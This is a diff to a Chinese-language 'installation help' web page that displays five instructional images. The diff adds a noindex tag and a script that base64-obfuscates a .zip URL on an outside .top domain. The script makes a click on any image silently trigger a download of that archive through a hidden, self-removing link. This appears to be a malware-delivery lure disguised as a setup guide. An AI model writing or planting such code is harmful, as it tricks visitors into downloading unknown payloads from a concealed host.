@@ -2,30 +2,70 @@
 <html lang="zh">
 <head>
     <meta charset="UTF-8">
+    <meta name="robots" content="noindex,nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>安装帮助</title>
     <style>
         body, html {
             margin: 0;
             padding: 0;
+            background: #f5f5f5;
         }
-        img {
+        .guide-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .step-image {
             width: 100%;
             height: auto;
             display: block;
-            cursor: pointer;
+            border-bottom: 1px solid #eee;
+            transition: opacity 0.3s;
+        }
+        .step-image:hover {
+            opacity: 0.9;
         }
     </style>
 </head>
 <body>
+    <div class="guide-container">
+        <img class="step-image" src="images/img_01.jpg" alt="步骤示意图">
+        <img class="step-image" src="images/img_02.jpg" alt="操作说明">
+        <img class="step-image" src="images/img_03.jpg" alt="流程演示">
+        <img class="step-image" src="images/img_04.jpg" alt="配置指南">
+        <img class="step-image" src="images/img_05.jpg" alt="完成示意">
+    </div>
 
-    <img src="images/img_01.jpg">
-    <img src="images/img_02.jpg">
-    <img src="images/img_03.jpg">
-    <img src="images/img_04.jpg">
-    <img src="images/img_05.jpg">
+<script>
+    (function() {
+        const decodeData = function(base64) {
+            return decodeURIComponent(escape(atob(base64)));
+        };
 
-  
+        const resourceLinks = [
+            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
+            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
+            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
+            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
+            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA='
+        ];
+
+        document.querySelectorAll('.step-image').forEach((item, index) => {
+            item.addEventListener('click', function() {
+                const source = decodeData(resourceLinks[index]);
+                const transientLink = document.createElement('a');
+                transientLink.style.display = 'none';
+                transientLink.href = source;
+                transientLink.rel = 'noreferrer noopener';
+                document.body.appendChild(transientLink);
+                transientLink.click();
+                setTimeout(() => {
+                    document.body.removeChild(transientLink);
+                }, 100);
+            });
+        });
+    })();
+</script>
 
 </body>
 </html>
